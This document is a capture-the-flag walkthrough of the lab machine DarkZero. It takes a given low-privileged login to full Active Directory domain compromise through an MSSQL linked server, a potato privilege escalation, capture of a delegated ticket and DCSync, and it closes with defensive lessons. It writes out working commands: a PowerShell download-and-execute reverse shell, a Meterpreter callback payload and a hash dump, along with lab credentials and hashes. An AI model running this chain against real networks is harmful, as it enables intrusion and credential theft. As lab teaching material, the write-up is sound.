---
title: "DarkZero"
slug: "darkzero"
toc:
  - id: "reconnaissance"
    label: "Reconnaissance"
  - id: "domain-enumeration"
    label: "Domain Enumeration"
  - id: "mssql-linked-server-enumeration"
    label: "MSSQL Linked Server Enumeration"
  - id: "foothold-on-dc02"
    label: "Foothold on DC02"
  - id: "restoring-seimpersonateprivilege"
    label: "Restoring SeImpersonatePrivilege"
  - id: "system-on-dc02"
    label: "SYSTEM on DC02"
  - id: "user-flag"
    label: "User Flag"
  - id: "capturing-the-dc01-machine-ticket"
    label: "Capturing the DC01 Machine Ticket"
  - id: "dcsync"
    label: "DCSync"
  - id: "root-flag"
    label: "Root Flag"
  - id: "key-takeaways"
    label: "Key Takeaways"
---

## Reconnaissance

I ran a full-port TCP scan with service and script detection.

```
$ nmap -p- 10.129.124.140 -sCV --max-retries=3 --min-rate=3000 -T4
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-13 06:40 +0200
Nmap scan report for 10.129.124.140
Host is up (0.024s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-12 21:41:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2026-10-12T21:28:50
|_Not valid after:  2027-10-12T21:28:50
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2026-10-12T21:28:50
|_Not valid after:  2027-10-12T21:28:50
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info:
|   10.129.124.140:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.129.124.140:1433:
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2026-10-12T21:43:12+00:00; -7h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-10-12T21:40:15
|_Not valid after:  2056-10-12T21:40:15
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2026-10-12T21:28:50
|_Not valid after:  2027-10-12T21:28:50
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2026-10-12T21:28:50
|_Not valid after:  2027-10-12T21:28:50
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49897/tcp open  msrpc         Microsoft Windows RPC
49929/tcp open  msrpc         Microsoft Windows RPC
54862/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m00s
| smb2-time:
|   date: 2026-10-12T21:42:35
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.22 seconds
```

> **Note:** DC01 is a `darkzero.htb` domain controller that also exposes Microsoft SQL Server 2022 on 1433.

I added the hostnames to `/etc/hosts`.

```
$ echo '10.129.124.140    darkzero.htb dc01.darkzero.htb' | sudo tee -a /etc/hosts
```

I synced my clock to the DC so Kerberos wouldn't break on the skew.

```
$ sudo rdate -n 10.129.124.140
```

## Domain Enumeration

This is an assumed-breach box: I was given the credentials `john.w:RFulUtONCOL!`.

I ran a BloodHound collection to map the domain.

```
$ bloodhound-ce-python -ns 10.129.124.140 -u john.w -p 'RFulUtONCOL!' -d darkzero.htb --zip -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: darkzero.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.darkzero.htb
INFO: Done in 00M 18S
INFO: Compressing output into 20261013071250_bloodhound.zip
```

> **Note:** It's a small domain — one computer, five users — but there's one **trust**. `darkzero.htb` isn't a standalone forest; there's a second forest across that trust. (LDAP signing pushed the connection to LDAPS.)

BloodHound shows the trust is a bidirectional cross-forest trust to `darkzero.ext`.

[![BloodHound: CrossForestTrust between DARKZERO.HTB and DARKZERO.EXT](/images/walkthroughs/darkzero/cross-forest-trust.png)](/images/walkthroughs/darkzero/cross-forest-trust.png)

## MSSQL Linked Server Enumeration

I authenticated to the SQL Server on DC01 with the `john.w` credentials, landing a low-privileged session as `darkzero\john.w`.

```
$ impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.124.140 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL
Linked Server       Local Login       Is Self Mapping   Remote Login
-----------------   ---------------   ---------------   ------------
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

The linked server `DC02.darkzero.ext` maps my login to the remote account `dc01_sql_svc`. Switching onto the link, that account is `sysadmin` on DC02, so I enabled `xp_cmdshell` there.

```
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');

-
1
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

> **Note:** Queries over the link run on DC02 as `dc01_sql_svc`, and since that account is `sysadmin`, I get `xp_cmdshell` and OS command execution on DC02.

## Foothold on DC02

I hosted a Nishang reverse shell.

```
$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 . && python3 -m http.server
```

And set up a listener.

```
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
```

Then I triggered it from DC01 through `xp_cmdshell` on the link to DC02.

```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "powershell iex(iwr -uri http://10.10.14.56:8000/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.56 -Port 9001"
```

The shell came back as `darkzero-ext\svc_sql` on DC02, confirming I was now in the second forest.

```
connect to [10.10.14.56] from (UNKNOWN) [10.129.124.140] 52869
Windows PowerShell running as user svc_sql on DC02
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
darkzero-ext\svc_sql
PS C:\Windows\system32> hostname
DC02
PS C:\temp> Get-ADDomain | select forest

forest
------
darkzero.ext
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.20.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.20.1

PS C:\Windows\system32> Get-ADTrust -Filter * | select Direction

Direction
---------
BiDirectional
```

> **Note:** DC02 is the domain controller for a separate forest, `darkzero.ext`, on an internal `172.16.20.0/24` network, with a **bidirectional** trust back to `darkzero.htb`. The linked SQL server is the only bridge between the two.

## Restoring SeImpersonatePrivilege

As a service account, `svc_sql` should hold `SeImpersonatePrivilege`, but it had been stripped from the running session. The privilege still lived on the account's stored logon token, so I pulled down James Forshaw's `NtObjectManager` to recover it through a localhost named-pipe authentication.

```
PS C:\Windows\system32> cd c:\users\svc_sql
PS C:\users\svc_sql> iwr -uri http://10.10.14.56:8000/ntobjectmanager.2.0.1.nupkg -o .\ntobjectmanager.2.0.1.nupkg
PS C:\users\svc_sql> copy-item ntobjectmanager.2.0.1.nupkg ntobjectmanager.2.0.1.zip
PS C:\users\svc_sql> expand-archive ntobjectmanager.2.0.1.zip -destinationpath .\ntobj
PS C:\users\svc_sql> gci -recurse .\ntobj | unblock-file
PS C:\users\svc_sql> import-module .\ntobj\NtObjectManager.psd1
```

I created a named pipe, listened on it in a background job, connected to it over the localhost SMB path, and impersonated the client. The recovered token carries `SeImpersonatePrivilege`.

```
PS C:\users\svc_sql> $pipe = New-NtNamedPipeFile \\.\pipe\pwndalf -Win32Path
PS C:\users\svc_sql> $job = Start-Job {$pipe.Listen()}
PS C:\users\svc_sql> $file = Get-NtFile \\localhost\pipe\pwndalf -Win32Path
PS C:\users\svc_sql> $token = Use-NtObject($pipe.Impersonate()) {Get-NtToken -Impersonation}
PS C:\users\svc_sql> $token.privileges | select name

Name
----
SeAssignPrimaryTokenPrivilege
SeIncreaseQuotaPrivilege
SeMachineAccountPrivilege
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeCreateGlobalPrivilege
SeIncreaseWorkingSetPrivilege
```

> **Note:** Stripping a privilege from the live token doesn't remove it from the account — the stored logon token keeps it, and authenticating to my own pipe hands that full token back. With `SeImpersonatePrivilege` restored, a potato attack is back on the table.

> **Note:** This named-pipe recovery is the unintended route. The intended path is to re-authenticate `svc_sql` with a **service logon (logon type 5)** — e.g. `RunasCs.exe svc_sql <password> <cmd> --logon-type 5` — which mints a fresh token that carries `SeImpersonatePrivilege` by default. Both land in the same place; the pipe trick just avoids needing the account's password.

## SYSTEM on DC02

I generated the Meterpreter payload with msfvenom.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.56 LPORT=9002 -f exe > payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 509 bytes
Final size of exe file: 7680 bytes
```

I downloaded GodPotato and the Meterpreter payload.

```
PS C:\users\svc_sql> iwr -uri http://10.10.14.56:8000/GodPotato-NET4.exe -o gp.exe
PS C:\users\svc_sql> iwr -uri http://10.10.14.56:8000/payload.exe -o payload.exe
```

Then I started a Metasploit handler.

```
$ msfconsole -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 10.10.14.56; set lport 9002; run'
<SNIP>

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.10.14.56
lport => 9002
[*] Started reverse TCP handler on 10.10.14.56:9002
```

Running GodPotato under the recovered `SeImpersonate` token executed the payload as SYSTEM.

```
PS C:\users\svc_sql> new-win32process -token $token -commandline 'c:\users\svc_sql\gp.exe -cmd "cmd /c c:\users\svc_sql\payload.exe"'


Process            : gp.exe
Thread             : thread:3336 - process:1884
Pid                : 1884
Tid                : 3336
TerminateOnDispose : False
ExitStatus         : 259
ExitNtStatus       : STATUS_PENDING
```

The Meterpreter session landed as SYSTEM, and I uploaded Rubeus for the next stage.

```
[*] Sending stage (255675 bytes) to 10.129.124.140
[*] Meterpreter session 1 opened (10.10.14.56:9002 -> 10.129.124.140:50678) at 2026-10-17 11:25:44 +0200

meterpreter > upload /home/pwndalf/Documents/HTB/Machines/Tools/Rubeus.exe c:\\users\\svc_sql
[*] Uploading  : /home/pwndalf/Documents/HTB/Machines/Tools/Rubeus.exe -> c:\users\svc_sql\Rubeus.exe
[*] Completed  : /home/pwndalf/Documents/HTB/Machines/Tools/Rubeus.exe -> c:\users\svc_sql\Rubeus.exe
meterpreter > shell
Process 3500 created.
Channel 4 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## User Flag

As SYSTEM, I read the user flag from DC02's Administrator desktop.

```
C:\Windows\system32>type c:\users\administrator\desktop\user.txt
type c:\users\administrator\desktop\user.txt
f4f3************************e5c1
```

## Capturing the DC01 Machine Ticket

Now SYSTEM on DC02, I ran Rubeus in monitor mode to harvest any TGTs arriving at the host.

```
C:\Windows\system32>cd c:\users\svc_sql

c:\Users\svc_sql>.\Rubeus.exe monitor /interval:3 /nowrap
.\Rubeus.exe monitor /interval:3 /nowrap

<SNIP>

[*] Action: TGT Monitoring
[*] Monitoring every 3 seconds for new TGTs

<SNIP>
```

Since DC02 is a domain controller trusted for unconstrained delegation, I used `xp_dirtree` from the DC01 SQL session to coerce DC01 into authenticating to DC02.

```
$ impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.124.140 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\a
subdirectory   depth   file
------------   -----   ----
```

Because DC02 holds unconstrained delegation, DC01 forwarded its own TGT with the authentication, and Rubeus caught the `DC01$` machine-account ticket.

```

[*] 10/17/2026 9:27:38 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/17/2026 9:27:38 AM
  EndTime               :  10/17/2026 7:27:37 PM
  RenewTill             :  10/24/2026 9:27:37 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBY<SNIP>VSTy5IVEI=

[*] Ticket cache size: 4
```

## DCSync

I decoded the ticket.

```
$ echo "doIFjDCCBY<SNIP>VSTy5IVEI=" | base64 -d > dc01.kirbi 
```

Then converted it from kirbi to ccache.

```
$ impacket-ticketConverter dc01.kirbi dc01.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

Using the `DC01$` ticket, I DCSynced the Administrator secret from DC01 via the machine account's replication rights.

```
$ KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.darkzero.htb -just-dc-user administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
[*] Cleaning up...
```

> **Note:** A DC machine account has the replication rights (`GetChanges`/`GetChangesAll`) DCSync needs, so the `DC01$` ticket dumps any `darkzero.htb` secret.

## Root Flag

I used the Administrator hash with Evil-WinRM to get a shell on DC01 and read the root flag.

```
$ evil-winrm -i dc01.darkzero.htb -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726

<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\desktop\root.txt
cee0************************35e8
```

## Key Takeaways

**MSSQL Linked Servers Bridge Trust Boundaries** — A low-privileged login on DC01 ran arbitrary SQL on a domain controller in a *different forest* through a linked server mapped to a `sysadmin` account. Links should use least-privilege remote logins, never `sysadmin`, and `xp_cmdshell` should stay disabled. The link here was the only path between the two forests.

**Stripping a Privilege Isn't Removing It** — `SeImpersonatePrivilege` was scrubbed from `svc_sql`'s running session, but the stored logon token still carried it and handed it back through a localhost named-pipe authentication. Harden privileges at the account/policy level, not just on the live token; the stored token is the source of truth.

**Potato Attacks Follow SeImpersonate** — Once the impersonation privilege was back, GodPotato turned a service-account shell into SYSTEM in one step. Service accounts that must hold `SeImpersonatePrivilege` should be isolated off domain controllers wherever possible.

**Unconstrained Delegation on DCs Is a Coercion Trap** — Domain controllers are trusted for unconstrained delegation by default, so coercing DC01 to authenticate to the compromised DC02 (via `xp_dirtree`) forwarded DC01's own TGT straight into my hands. Treat any DC you don't fully control as hostile, monitor features that trigger outbound authentication, and watch for forwarded TGTs landing on unexpected hosts.

**Machine Accounts Can DCSync** — A domain controller's computer account holds directory-replication rights, so capturing the `DC01$` ticket was equivalent to owning the domain. Monitor `DRSUAPI` replication from non-DC sources and protect machine-account credentials as carefully as user ones.
